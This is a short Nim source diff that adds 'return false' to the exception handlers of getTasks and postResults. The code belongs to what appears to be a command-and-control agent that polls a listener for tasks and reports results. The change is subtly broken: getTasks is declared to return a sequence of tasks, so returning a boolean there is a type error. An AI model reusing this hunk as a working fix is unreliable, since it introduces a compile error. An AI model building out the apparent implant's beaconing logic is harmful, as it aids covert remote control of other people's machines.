@@ -43,6 +43,7 @@ proc getTasks*(config: AgentConfig, agent: string): seq[Task] =
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
         echo "[-] [getTasks]:", err.msg
+        return false
     finally:
         client.close()
 
@@ -65,6 +66,7 @@ proc postResults*(config: AgentConfig, agent: string, task: Task): bool =
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
         echo "[-] [postResults]: ", err.msg
+        return false
     finally:
         client.close()
 
